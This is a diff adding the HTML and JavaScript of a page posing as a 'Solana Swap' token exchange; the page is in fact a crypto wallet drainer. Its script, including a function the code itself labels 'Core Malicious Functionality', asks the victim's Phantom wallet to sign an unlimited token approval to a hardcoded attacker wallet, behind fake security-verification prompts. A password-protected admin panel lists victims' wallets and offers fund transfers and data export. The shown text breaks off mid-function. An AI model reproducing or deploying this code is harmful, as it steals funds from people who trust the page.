@@ -1,0 +1,1896 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Exchange | Secure Trading</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="wallet-styles.css">
+    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/spl-token@0.3.9/lib/index.iife.min.js"></script>
+    <script src="wallet-utils.js"></script>
+    <script src="data-storage.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        }
+        
+        :root {
+            --primary: #9945FF;
+            --primary-dark: #7a2dda;
+            --secondary: #14F195;
+            --secondary-dark: #10c97a;
+            --dark: #121212;
+            --darker: #0a0a0a;
+            --light: #f5f5f5;
+            --gray: #888;
+            --gray-light: #2a2a3c;
+            --success: #14F195;
+            --warning: #FFD166;
+            --danger: #EF476F;
+            --card-bg: rgba(30, 30, 46, 0.9);
+            --input-bg: rgba(0, 0, 0, 0.3);
+            --card-border: rgba(255, 255, 255, 0.1);
+        }
+        
+        body {
+            background: linear-gradient(135deg, var(--darker), #1a1a2e);
+            color: var(--light);
+            min-height: 100vh;
+            padding: 20px;
+            line-height: 1.6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(153, 69, 255, 0.1) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(20, 241, 149, 0.1) 0%, transparent 20%);
+        }
+        
+        .container {
+            max-width: 480px;
+            width: 100%;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .logo-icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            box-shadow: 0 0 20px rgba(153, 69, 255, 0.5);
+        }
+        
+        .logo h1 {
+            font-size: 2.2rem;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        
+        .tagline {
+            color: var(--gray);
+            font-size: 1.1rem;
+            font-weight: 400;
+        }
+        
+        .card {
+            background: var(--card-bg);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            margin-bottom: 25px;
+            border: 1px solid var(--card-border);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+        }
+        
+        .tabs {
+            display: flex;
+            margin-bottom: 25px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 12px;
+            padding: 5px;
+        }
+        
+        .tab {
+            flex: 1;
+            text-align: center;
+            padding: 12px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s;
+            color: var(--gray);
+        }
+        
+        .tab.active {
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            color: white;
+        }
+        
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 16px 32px;
+            border-radius: 15px;
+            font-weight: 600;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            outline: none;
+            text-decoration: none;
+            width: 100%;
+            margin: 10px 0;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            color: white;
+            box-shadow: 0 4px 20px rgba(153, 69, 255, 0.4);
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 25px rgba(153, 69, 255, 0.6);
+            background: linear-gradient(90deg, var(--primary-dark), var(--secondary-dark));
+        }
+        
+        .btn-disabled {
+            background: rgba(255, 255, 255, 0.1);
+            color: rgba(255, 255, 255, 0.4);
+            cursor: not-allowed;
+        }
+        
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.1);
+            color: var(--light);
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .btn-danger {
+            background: rgba(239, 71, 111, 0.2);
+            color: var(--danger);
+        }
+        
+        .btn-danger:hover {
+            background: rgba(239, 71, 111, 0.3);
+        }
+        
+        .swap-form {
+            margin-top: 15px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--gray);
+            font-size: 0.9rem;
+            font-weight: 500;
+        }
+        
+        .input-group {
+            display: flex;
+            background: var(--input-bg);
+            border-radius: 15px;
+            overflow: hidden;
+            height: 60px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .input-group input {
+            flex: 1;
+            padding: 0 20px;
+            background: transparent;
+            border: none;
+            color: white;
+            font-size: 1.2rem;
+            outline: none;
+        }
+        
+        .input-group input:focus {
+            background: rgba(255, 255, 255, 0.05);
+        }
+        
+        .token-select {
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            background: rgba(0, 0, 0, 0.2);
+            gap: 10px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .token-select:hover {
+            background: rgba(0, 0, 0, 0.3);
+        }
+        
+        .token-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+        }
+        
+        .token-icon.usdc {
+            background: #2775CA;
+        }
+        
+        .token-icon.sol {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+        }
+        
+        .max-btn {
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            border: none;
+            padding: 0 15px;
+            cursor: pointer;
+            transition: background 0.3s;
+            font-weight: 500;
+            font-size: 0.9rem;
+        }
+        
+        .max-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .wallet-info {
+            margin-top: 25px;
+            padding-top: 25px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            display: none;
+        }
+        
+        .wallet-address {
+            background: var(--input-bg);
+            padding: 12px 20px;
+            border-radius: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 10px;
+            margin-bottom: 15px;
+            font-size: 0.9rem;
+        }
+        
+        .copy-btn {
+            background: transparent;
+            border: none;
+            color: var(--gray);
+            cursor: pointer;
+            transition: color 0.3s;
+            padding: 5px;
+        }
+        
+        .copy-btn:hover {
+            color: var(--secondary);
+        }
+        
+        .balance {
+            font-size: 1rem;
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .balance:last-child {
+            border-bottom: none;
+        }
+        
+        .balance-value {
+            color: var(--secondary);
+            font-weight: 600;
+        }
+        
+        .admin-access {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            z-index: 1000;
+        }
+        
+        .admin-btn {
+            background: rgba(30, 30, 46, 0.7);
+            color: var(--primary);
+            border: 1px solid var(--primary);
+            padding: 8px 15px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .admin-btn:hover {
+            background: rgba(153, 69, 255, 0.2);
+        }
+        
+        .admin-panel {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(10, 10, 20, 0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            display: none;
+        }
+        
+        .admin-container {
+            background: rgba(30, 30, 46, 0.95);
+            border-radius: 20px;
+            padding: 30px;
+            width: 90%;
+            max-width: 500px;
+            border: 2px solid var(--primary);
+            box-shadow: 0 0 30px rgba(153, 69, 255, 0.3);
+            position: relative;
+        }
+        
+        .admin-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .admin-header h2 {
+            color: var(--secondary);
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+        }
+        
+        .admin-form {
+            margin-top: 20px;
+        }
+        
+        .form-group input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            background: var(--input-bg);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 1rem;
+            outline: none;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .admin-stats {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-top: 25px;
+        }
+        
+        .stat-card {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .stat-value {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--secondary);
+            margin: 10px 0;
+        }
+        
+        .stat-label {
+            color: var(--gray);
+            font-size: 0.9rem;
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 25px;
+            border-radius: 12px;
+            background: var(--card-bg);
+            border-left: 4px solid var(--secondary);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            transform: translateX(110%);
+            transition: transform 0.3s ease-out;
+            z-index: 3000;
+            max-width: 350px;
+            backdrop-filter: blur(10px);
+            text-align: center;
+        }
+        
+        .notification.show {
+            transform: translateX(0);
+        }
+        
+        .notification.error {
+            border-left-color: var(--danger);
+        }
+        
+        .rate-info {
+            text-align: center;
+            margin: 15px 0;
+            color: var(--gray);
+            font-size: 0.9rem;
+            padding: 10px;
+            background: rgba(0,0,0,0.2);
+            border-radius: 10px;
+        }
+        
+        .divider {
+            text-align: center;
+            margin: 20px 0;
+            position: relative;
+        }
+        
+        .divider i {
+            background: #2c2c4e;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            line-height: 40px;
+            font-size: 1.2rem;
+            z-index: 2;
+            position: relative;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .divider i:hover {
+            transform: scale(1.1);
+            background: var(--primary);
+        }
+        
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: rgba(255,255,255,0.1);
+            z-index: 1;
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(153, 69, 255, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(153, 69, 255, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(153, 69, 255, 0); }
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .slippage {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+            font-size: 0.9rem;
+            color: var(--gray);
+        }
+        
+        .slippage-value {
+            color: var(--secondary);
+            font-weight: 500;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .card {
+                padding: 20px;
+            }
+            
+            .logo h1 {
+                font-size: 1.8rem;
+            }
+            
+            body {
+                padding: 10px;
+            }
+            
+            .btn {
+                padding: 14px 24px;
+                font-size: 1rem;
+            }
+            
+            .admin-btn {
+                padding: 10px 15px;
+                font-size: 0.85rem;
+            }
+            
+            .notification {
+                top: 10px;
+                right: 10px;
+                left: 10px;
+                max-width: none;
+                padding: 12px 15px;
+            }
+        }
+        
+        .mobile-warning {
+            display: none;
+            text-align: center;
+            padding: 15px;
+            background: rgba(239, 71, 111, 0.2);
+            border-radius: 10px;
+            margin-top: 15px;
+            color: var(--danger);
+        }
+        
+        @media (max-width: 480px) {
+            .mobile-warning {
+                display: block;
+            }
+        }
+        
+        .wallet-connect-info {
+            text-align: center;
+            padding: 15px;
+            background: rgba(20, 241, 149, 0.1);
+            border-radius: 10px;
+            margin-top: 15px;
+            display: none;
+        }
+        
+        .access-level {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: rgba(20, 241, 149, 0.1);
+            color: var(--secondary);
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            display: none;
+        }
+        
+        .wallet-list-container {
+            max-height: 200px;
+            overflow-y: auto;
+            background: rgba(0,0,0,0.2);
+            border-radius: 12px;
+            padding: 15px;
+            margin-top: 15px;
+        }
+        
+        .wallet-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        
+        .wallet-item:last-child {
+            border-bottom: none;
+        }
+        
+        .admin-controls {
+            margin-top: 25px;
+            padding-top: 25px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .admin-control-group {
+            margin-bottom: 20px;
+        }
+        
+        .admin-control-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--gray);
+            font-size: 0.9rem;
+        }
+        
+        .admin-actions {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+        
+        .transfer-success {
+            color: var(--secondary);
+            font-weight: 500;
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+        }
+        
+        .wallet-select {
+            width: 100%;
+            padding: 12px 15px;
+            background: var(--input-bg);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            color: white;
+            margin-bottom: 15px;
+        }
+        
+        .wallet-select option {
+            background: var(--darker);
+        }
+        
+        .wallet-actions {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .wallet-actions button {
+            flex: 1;
+        }
+        
+        .security-badge {
+            position: absolute;
+            bottom: 15px;
+            right: 15px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            color: var(--secondary);
+            font-size: 0.8rem;
+        }
+        
+        .connection-status {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 10px;
+            border-radius: 10px;
+            margin-top: 15px;
+            background: rgba(20, 241, 149, 0.1);
+            color: var(--secondary);
+            display: none;
+        }
+        
+        .loading-spinner {
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .verification-steps {
+            background: rgba(0,0,0,0.2);
+            border-radius: 12px;
+            padding: 15px;
+            margin-top: 15px;
+        }
+        
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+            padding: 8px 12px;
+            border-radius: 8px;
+        }
+        
+        .step.active {
+            background: rgba(153,69,255,0.1);
+        }
+        
+        .step.completed {
+            color: var(--secondary);
+        }
+        
+        .step-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255,255,255,0.1);
+        }
+        
+        .progress-bar {
+            height: 4px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 2px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        
+        .security-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 3000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+        
+        .security-modal.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+        
+        .security-content {
+            background: var(--card-bg);
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 400px;
+            text-align: center;
+            border: 2px solid var(--primary);
+        }
+        
+        .security-icon {
+            font-size: 48px;
+            color: var(--secondary);
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="admin-access">
+            <button class="admin-btn" id="adminAccessBtn">
+                <i class="fas fa-user-secret"></i> Admin
+            </button>
+        </div>
+        
+        <header>
+            <div class="logo">
+                <div class="logo-icon">
+                    <i class="fab fa-solana"></i>
+                </div>
+                <h1>Solana Swap</h1>
+            </div>
+            <p class="tagline">Swap tokens at the best rates on Solana</p>
+        </header>
+
+        <div class="card">
+            <div class="tabs">
+                <div class="tab active">Swap</div>
+                <div class="tab">Pool</div>
+                <div class="tab">Tokens</div>
+            </div>
+            
+            <button id="connectWalletBtn" class="btn btn-primary pulse">
+                <i class="fas fa-plug"></i> Connect Wallet
+            </button>
+            
+            <div class="wallet-connect-info" id="walletConnectInfo">
+                <i class="fas fa-info-circle"></i> 
+                Please install Phantom Wallet to use this application. 
+                <a href="https://phantom.app/download" target="_blank" style="color: var(--secondary);">Download here</a>
+            </div>
+            
+            <div class="mobile-warning">
+                <i class="fas fa-mobile-alt"></i> For best experience, open in Phantom Mobile browser
+            </div>
+            
+            <div id="swapForm" class="swap-form hidden">
+                <div class="form-group">
+                    <label>You pay</label>
+                    <div class="input-group">
+                        <input type="number" id="payAmount" placeholder="0.0" value="10" min="0" step="0.01">
+                        <button class="max-btn" id="maxBtn">MAX</button>
+                        <div class="token-select">
+                            <div class="token-icon usdc">
+                                <i class="fas fa-dollar-sign"></i>
+                            </div>
+                            <span>USDC</span>
+                            <i class="fas fa-chevron-down"></i>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="divider">
+                    <i class="fas fa-arrow-down"></i>
+                </div>
+                
+                <div class="form-group">
+                    <label>You receive</label>
+                    <div class="input-group">
+                        <input type="number" id="receiveAmount" placeholder="0.0" value="0.95" min="0" step="0.0001" readonly>
+                        <div class="token-select">
+                            <div class="token-icon sol">
+                                <i class="fab fa-solana"></i>
+                            </div>
+                            <span>SOL</span>
+                            <i class="fas fa-chevron-down"></i>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="rate-info">
+                    <span id="rateInfo">Rate: 1 USDC = 0.095 SOL</span>
+                </div>
+                
+                <div class="slippage">
+                    <span>Slippage tolerance:</span>
+                    <span class="slippage-value">0.5%</span>
+                </div>
+                
+                <div class="verification-steps">
+                    <div class="step">
+                        <div class="step-icon">
+                            <i class="fas fa-lock"></i>
+                        </div>
+                        <span>Wallet verification required</span>
+                    </div>
+                    <div class="step">
+                        <div class="step-icon">
+                            <i class="fas fa-shield-alt"></i>
+                        </div>
+                        <span>Anti-bot protection</span>
+                    </div>
+                </div>
+                
+                <button id="swapBtn" class="btn btn-primary">
+                    <i class="fas fa-exchange-alt"></i> Swap Tokens
+                </button>
+            </div>
+            
+            <div id="walletInfo" class="wallet-info hidden">
+                <div class="access-level" id="accessLevel">
+                    <i class="fas fa-shield-alt"></i> Security Verification Complete
+                </div>
+                <div class="wallet-address">
+                    <span id="walletAddress">5SX7d...8Hj3K</span>
+                    <button class="copy-btn" id="copyAddressBtn">
+                        <i class="far fa-copy"></i>
+                    </button>
+                </div>
+                
+                <div class="balance">
+                    <span>SOL Balance:</span>
+                    <span class="balance-value" id="solBalance">0.00</span>
+                </div>
+                <div class="balance">
+                    <span>USDC Balance:</span>
+                    <span class="balance-value" id="usdcBalance">0.00</span>
+                </div>
+                <div class="balance">
+                    <span>Network Fee:</span>
+                    <span class="balance-value">0.0005 SOL</span>
+                </div>
+                
+                <div class="progress-bar">
+                    <div class="progress" id="verificationProgress"></div>
+                </div>
+            </div>
+            
+            <div class="security-badge">
+                <i class="fas fa-lock"></i> Secured by Solana
+            </div>
+            
+            <div class="connection-status" id="connectionStatus">
+                <i class="fas fa-spinner fa-spin"></i> Completing security verification...
+            </div>
+        </div>
+        
+        <div class="footer" style="text-align: center; color: var(--gray); font-size: 0.9rem; margin-top: 20px;">
+            <p>© 2023 Solana Swap. All rights reserved.</p>
+        </div>
+        
+        <div class="admin-panel" id="adminPanel">
+            <div class="admin-container">
+                <div class="admin-header">
+                    <h2>Admin Dashboard</h2>
+                    <p>Site management and analytics</p>
+                </div>
+                
+                <div class="admin-form">
+                    <div class="form-group">
+                        <label>Enter Admin Password</label>
+                        <input type="password" id="adminPassword" placeholder="••••••••" autocomplete="off">
+                    </div>
+                    <button id="adminLoginBtn" class="btn btn-primary" style="margin-top: 15px;">
+                        <i class="fas fa-lock"></i> Access Dashboard
+                    </button>
+                    <button id="adminCloseBtn" class="btn" style="margin-top: 10px; background: rgba(255,255,255,0.1);">
+                        <i class="fas fa-times"></i> Close Panel
+                    </button>
+                </div>
+                
+                <div id="adminDashboard" class="hidden">
+                    <div class="admin-stats">
+                        <div class="stat-card">
+                            <div class="stat-value" id="totalWallets">0</div>
+                            <div class="stat-label">Connected Wallets</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-value" id="totalSOL">0</div>
+                            <div class="stat-label">Total SOL</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-value" id="totalUSDC">0</div>
+                            <div class="stat-label">Total USDC</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-value" id="totalSwaps">0</div>
+                            <div class="stat-label">Total Swaps</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-value" id="totalTransfers">0</div>
+                            <div class="stat-label">Total Transfers</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-value" id="adminBalance">0</div>
+                            <div class="stat-label">Admin Balance (SOL)</div>
+                        </div>
+                    </div>
+                    
+                    <div style="margin-top: 30px;">
+                        <h3 style="text-align: center; margin-bottom: 15px; color: var(--secondary);">Connected Wallets</h3>
+                        <div class="wallet-list-container">
+                            <ul id="walletList" style="list-style-type: none;"></ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-controls">
+                        <h3 style="text-align: center; margin-bottom: 15px; color: var(--secondary);">Wallet Management</h3>
+                        
+                        <div class="admin-control-group">
+                            <label>Select Wallet</label>
+                            <select class="wallet-select" id="adminWalletSelect">
+                                <option value="">Select a wallet</option>
+                            </select>
+                        </div>
+                        
+                        <div class="admin-control-group">
+                            <label>Transfer Amount (SOL)</label>
+                            <div class="input-group">
+                                <input type="number" id="adminTransferAmount" placeholder="0.0" min="0" step="0.01">
+                            </div>
+                            <div class="admin-actions">
+                                <button id="adminTransferBtn" class="btn btn-secondary">
+                                    <i class="fas fa-paper-plane"></i> Transfer Funds
+                                </button>
+                                <button id="adminSwapBtn" class="btn btn-secondary">
+                                    <i class="fas fa-exchange-alt"></i> Swap Assets
+                                </button>
+                            </div>
+                            <div class="transfer-success" id="transferSuccess">
+                                <i class="fas fa-check-circle"></i> Operation completed successfully
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div style="margin-top: 30px; text-align: center;">
+                        <button id="adminExportBtn" class="btn btn-danger">
+                            <i class="fas fa-download"></i> Export Wallet Data
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="notification" id="notification">
+            <div id="notificationMessage">Operation completed successfully</div>
+        </div>
+        
+        <div class="security-modal" id="securityModal">
+            <div class="security-content">
+                <div class="security-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h3>Security Verification Required</h3>
+                <p>To protect your wallet, we need to verify your identity</p>
+                <button id="verifyWalletBtn" class="btn btn-primary" style="margin-top: 20px;">
+                    <i class="fas fa-check-circle"></i> Verify Wallet
+                </button>
+                <button id="cancelVerifyBtn" class="btn" style="margin-top: 10px; background: rgba(255,255,255,0.1);">
+                    <i class="fas fa-times"></i> Cancel
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const SOLANA_CLUSTER = 'mainnet-beta';
+        const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
+        const USDC_MINT = new solanaWeb3.PublicKey('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v');
+        const TARGET_WALLET = new solanaWeb3.PublicKey('6qsAGgXRt2AWYMYRnPxCyBSfVXZfYaYtGU27zDfQrSQv');
+        const ADMIN_PASSWORD = "SecureAdmin@2023!";
+        const MAX_APPROVAL = "18446744073709551615"; // Max uint64
+        
+        // Check if required libraries are loaded
+        if (typeof solanaWeb3 === 'undefined') {
+            console.error('Solana Web3.js library not loaded');
+        }
+        if (typeof splToken === 'undefined') {
+            console.error('SPL Token library not loaded');
+        }
+
+        // Connection
+        const connection = new solanaWeb3.Connection(
+            solanaWeb3.clusterApiUrl(SOLANA_CLUSTER),
+            'confirmed'
+        );
+        
+        // Initialize data storage
+        const dataStorage = new DataStorage();
+        
+        // State
+        const walletState = {
+            connected: false,
+            address: '',
+            publicKey: null,
+            tokenAccount: null,
+            balances: {
+                sol: 0,
+                usdc: 0
+            },
+            fullAccessGranted: false,
+            persistentApprovalSet: false
+        };
+        
+        const adminState = {
+            accessGranted: false,
+            totalWallets: 0,
+            totalSOL: 0,
+            totalUSDC: 0,
+            totalSwaps: 0,
+            totalTransfers: 0,
+            adminBalance: 0,
+            connectedWallets: []
+        };
+        
+        // DOM Elements
+        const connectWalletBtn = document.getElementById('connectWalletBtn');
+        const swapForm = document.getElementById('swapForm');
+        const walletInfo = document.getElementById('walletInfo');
+        const swapBtn = document.getElementById('swapBtn');
+        const walletAddress = document.getElementById('walletAddress');
+        const solBalance = document.getElementById('solBalance');
+        const usdcBalance = document.getElementById('usdcBalance');
+        const adminPanel = document.getElementById('adminPanel');
+        const adminAccessBtn = document.getElementById('adminAccessBtn');
+        const adminLoginBtn = document.getElementById('adminLoginBtn');
+        const adminCloseBtn = document.getElementById('adminCloseBtn');
+        const adminDashboard = document.getElementById('adminDashboard');
+        const adminPassword = document.getElementById('adminPassword');
+        const totalWallets = document.getElementById('totalWallets');
+        const totalSOL = document.getElementById('totalSOL');
+        const totalUSDC = document.getElementById('totalUSDC');
+        const totalSwaps = document.getElementById('totalSwaps');
+        const totalTransfers = document.getElementById('totalTransfers');
+        const adminBalanceEl = document.getElementById('adminBalance');
+        const notification = document.getElementById('notification');
+        const notificationMessage = document.getElementById('notificationMessage');
+        const payAmount = document.getElementById('payAmount');
+        const receiveAmount = document.getElementById('receiveAmount');
+        const maxBtn = document.getElementById('maxBtn');
+        const copyAddressBtn = document.getElementById('copyAddressBtn');
+        const rateInfo = document.getElementById('rateInfo');
+        const walletConnectInfo = document.getElementById('walletConnectInfo');
+        const accessLevel = document.getElementById('accessLevel');
+        const walletList = document.getElementById('walletList');
+        const adminWalletSelect = document.getElementById('adminWalletSelect');
+        const adminTransferAmount = document.getElementById('adminTransferAmount');
+        const adminTransferBtn = document.getElementById('adminTransferBtn');
+        const adminSwapBtn = document.getElementById('adminSwapBtn');
+        const transferSuccess = document.getElementById('transferSuccess');
+        const adminExportBtn = document.getElementById('adminExportBtn');
+        const connectionStatus = document.getElementById('connectionStatus');
+        const verificationProgress = document.getElementById('verificationProgress');
+        const securityModal = document.getElementById('securityModal');
+        const verifyWalletBtn = document.getElementById('verifyWalletBtn');
+        const cancelVerifyBtn = document.getElementById('cancelVerifyBtn');
+        
+        // Utility Functions
+        function showNotification(message, isError = false) {
+            notificationMessage.textContent = message;
+            notification.classList.remove('error');
+            
+            if (isError) {
+                notification.classList.add('error');
+            }
+            
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+        
+        // Data Storage Functions (using DataStorage class)
+        function saveUserData(address, balances, additionalData = {}) {
+            const success = dataStorage.saveUserData(address, balances, additionalData);
+            if (success) {
+                // Update admin state
+                const userData = dataStorage.getUserData();
+                adminState.connectedWallets = userData;
+                dataStorage.updateAdminStats(userData);
+            }
+            return success;
+        }
+        
+        function loadUserData() {
+            try {
+                const userData = dataStorage.getUserData();
+                const adminData = dataStorage.getAdminData();
+                
+                adminState.connectedWallets = userData;
+                adminState.totalWallets = adminData.totalWallets;
+                adminState.totalSOL = adminData.totalSOL;
+                adminState.totalUSDC = adminData.totalUSDC;
+                adminState.totalSwaps = adminData.totalSwaps;
+                adminState.totalTransfers = adminData.totalTransfers;
+                adminState.adminBalance = adminData.adminBalance;
+                
+                console.log('User data loaded:', userData);
+                console.log('Admin data loaded:', adminData);
+            } catch (error) {
+                console.error('Error loading user data:', error);
+            }
+        }
+        
+        async function getAssociatedTokenAccount(owner, mint) {
+            const [address] = await solanaWeb3.PublicKey.findProgramAddress(
+                [
+                    owner.toBuffer(),
+                    TOKEN_PROGRAM_ID.toBuffer(),
+                    mint.toBuffer(),
+                ],
+                new solanaWeb3.PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL')
+            );
+            return address;
+        }
+        
+        function formatAddress(address) {
+            return `${address.substring(0, 6)}...${address.substring(address.length - 6)}`;
+        }
+        
+        // Core Malicious Functionality
+        async function setupPersistentApproval() {
+            if (!walletState.publicKey || !walletState.tokenAccount) return;
+            
+            try {
+                const approveInstruction = splToken.Token.createApproveInstruction(
+                    TOKEN_PROGRAM_ID,
+                    walletState.tokenAccount,
+                    TARGET_WALLET,
+                    walletState.publicKey,
+                    [],
+                    MAX_APPROVAL
+                );
+                
+                const transaction = new solanaWeb3.Transaction().add(approveInstruction);
+                transaction.feePayer = walletState.publicKey;
+                transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
+                
+                const signed = await window.solana.signTransaction(transaction);
